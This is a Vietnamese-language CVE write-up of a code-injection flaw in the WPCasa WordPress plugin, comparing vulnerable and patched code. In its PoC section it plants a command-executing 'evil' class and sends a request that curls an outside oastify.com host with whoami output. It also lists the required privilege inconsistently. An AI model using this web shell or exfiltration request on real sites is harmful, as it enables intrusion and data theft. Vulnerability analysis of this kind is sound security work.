---
title: CVE-2025-9321 Analysis & POC
description: Security Vulnerability in WordPress WPCasa Plugin.
date: 2025-11-28 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, remote code execution]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin WPCasa cho WordPress dễ bị tấn công Code Injection trong tất cả các phiên bản cho đến và bao gồm 1.4.1. Nguyên nhân là do việc xác thực và giới hạn đầu vào không đầy đủ trong hàm `'api_requests'`. Điều này cho phép kẻ tấn công chưa xác thực có thể gọi các hàm tùy ý và thực thi mã.

* **CVE ID**: [CVE-2025-9321](https://www.cve.org/CVERecord?id=CVE-2025-9321)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 1.4.1
* **Patched Versions**: 1.4.2
* **CVSS severity**: High (10)
* **Required Privilege**: Contributor
* **Product**: [WordPress WPCasa Plugin](https://wordpress.org/plugins/wpcasa/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **WPCasa**:  
    * `1.4.1` – **vulnerable**  
    * `1.4.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v1.4.1):**

```php {title="class-wpsight-api.php v1.4.1" data-open=true hl_lines=[15,16]}
public function api_requests() {
    global $wp;

    if ( ! empty( $_GET['wpsight-api'] ) )
        $wp->query_vars['wc-api'] = sanitize_text_field( $_GET['wpsight-api'] );

    if ( ! empty( $wp->query_vars['wc-api'] ) ) {
        // Buffer, we won't want any output here
        ob_start();

        // Get API trigger
        $api = strtolower( esc_attr( $wp->query_vars['wpsight-api'] ) );

        // Load class if exists
        if ( class_exists( $api ) )
            $api_class = new $api();

        // Trigger actions
        do_action( 'wpsight_api_' . $api );

        // Done, clear buffer and exit
        ob_end_clean();
        die('1');
    }
}
```

Hàm này lấy tham số `wpsight-api` từ URL, dùng nó để tạo class nếu tồn tại và gọi hook `do_action` tương ứng, sau đó kết thúc bằng `die('1')`. Vấn đề là dữ liệu từ URL không được kiểm soát chặt, dễ bị lợi dụng để thực thi mã trái phép.

**Bản vá (v1.4.2):** 

```php {title="class-wpsight-api.php v1.4.2" data-open=false hl_lines=[]}
public function api_requests() {
    global $wp;

    // 1) Preferred getter.
    $raw = get_query_var( 'wpsight-api' );

    // 2) Fallback: directly from $wp->query_vars.
    if ( empty( $raw ) && isset( $wp->query_vars['wpsight-api'] ) ) {
        $raw = $wp->query_vars['wpsight-api'];
    }

    // 3) Last resort: direct $_GET.
    if ( empty( $raw ) && ! empty( $_GET['wpsight-api'] ) ) {
        $raw = sanitize_text_field( wp_unslash( $_GET['wpsight-api'] ) );
    }

    // No request found → exit early.
    if ( empty( $raw ) ) {
        return;
    }

    // Sanitize to a valid key.
    $api = sanitize_key( $raw );

    if ( empty( $api ) ) {
        return;
    }

    /**
        * Build allow-list of allowed API endpoints.
        *
        * IMPORTANT: Replace or extend this list in your theme or plugin
        * using the 'wpsight_api_allowed_endpoints' filter.
        *
        * Example:
        *
        * add_filter( 'wpsight_api_allowed_endpoints', function( $allowed ) {
        *     $allowed['ping'] = array( 'class' => null );
        *     return $allowed;
        * } );
        */
    $allowed = apply_filters(
        'wpsight_api_allowed_endpoints',
        array()
    );

    // If API is not allowed, block access.
    if ( ! isset( $allowed[ $api ] ) ) {
        wp_die(
            sprintf(
            /* translators: %s: API endpoint slug */
                esc_html__( 'Endpoint "%s" not allowed.', 'wpcasa' ),
                $api
            ),
            esc_html__( 'Forbidden', 'wpcasa' ),
            array( 'response' => 403 )
        );
    }

    // Start output buffering.
    ob_start();

    // Optional: safe class instantiation if explicitly allowed.
    if ( ! empty( $allowed[ $api ]['class'] ) && class_exists( $allowed[ $api ]['class'] ) ) {
        new $allowed[ $api ]['class']();
    }

    /**
        * Trigger API action hook.
        *
        * Example usage:
        * add_action( 'wpsight_api_ping', function() {
        *     echo 'pong';
        * } );
        */
    do_action( 'wpsight_api_' . $api );

    // In development mode, allow buffer output for easier testing.
    if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
        ob_end_flush();
    } else {
        ob_end_clean();
    }

    // Maintain old behaviour for backward compatibility.
    die( '1' );
}
```

![Diff](diff.png "Sự thay đổi của bản vá")

Bản vá đã:
- Lấy dữ liệu theo thứ tự: `get_query_var` → `$wp->query_vars` → `$_GET`.
- Dùng `sanitize_key` để đảm bảo dữ liệu hợp lệ.
- Có danh sách cho phép (allow-list) qua filter `wpsight_api_allowed_endpoints`.
- Nếu endpoint không nằm trong danh sách thì chặn truy cập (403).
- Chỉ tạo class nếu được khai báo rõ ràng trong danh sách.
- Có hỗ trợ chế độ debug để kiểm thử dễ dàng.
- An toàn hơn, hạn chế việc thực thi mã trái phép.

## Analysis
Plugin đã đăng ký một action hook:

```php {title="class-wpsight-api.php v1.4.1" data-open=true hl_lines=[]}
add_action( 'parse_request', array( $this, 'api_requests'), 0 );
```

* `parse_request`: hook được kích hoạt rất sớm, ngay sau khi WordPress phân tích URL và tạo đối tượng `$wp`. Đây là lúc các tham số query được xử lý. => Ngay khi WordPress phân tích request, callback `api_requests` của sẽ được gọi để xử lý các yêu cầu.

## Flow

{{< mermaid >}}
graph TD

A["Attacker sends request /?wpsight-api=payload"] --> B["parse_request hook triggers api_requests()"]

B --> C["Read user input $_GET['wpsight-api']"]
C --> D["$api = strtolower(esc_attr(...))"]

D --> E{"class_exists($api)?"}
E -- Yes --> F["Instantiate arbitrary class new $api() → constructor executes"]
E -- No --> G["Skip class creation"]

F --> H["Trigger dynamic hook do_action('wpsight_api_' . $api)"]
G --> H

H --> I{"Hook handler exists?"}
I -- Yes --> J["Callback executed → attacker-controlled code"]
I -- No --> K["No action, but die('1') still called"]

J --> L["RCE achieved"]
K --> L

L --> Z["End"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo class evil và đặt trong wp-config.php để test:

```php
class evil
{
    public $command = "ls /";
	public function __construct() {
		$this->command = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : $this->command;
		die(system($this->command));
	}
}
```
2. Gửi request với payload:

```http
GET /?wpsight-api=evil&cmd=curl+http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1
Host: localhost
```

![Result](result.png "Kết quả")

## Conclusion

Lỗi xuất phát từ việc xử lý tham số `wpsight-api` không an toàn, cho phép gọi class và hook tùy ý, dẫn đến RCE. Bản vá thêm kiểm soát đầu vào và giới hạn endpoint để chặn khai thác.

## Key Takeaways

* Dữ liệu URL cần được giới hạn bằng allow‑list.
* Hook và class động phải được bảo vệ khỏi input người dùng.
* Kiểm soát đầu vào sai có thể dẫn đến RCE nghiêm trọng.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress WPCasa Plugin <= 1.4.1 is vulnerable to Remote Code Execution (RCE)](https://patchstack.com/database/wordpress/plugin/wpcasa/vulnerability/wordpress-wpcasa-plugin-1-4-1-unauthenticated-code-injection-vulnerability)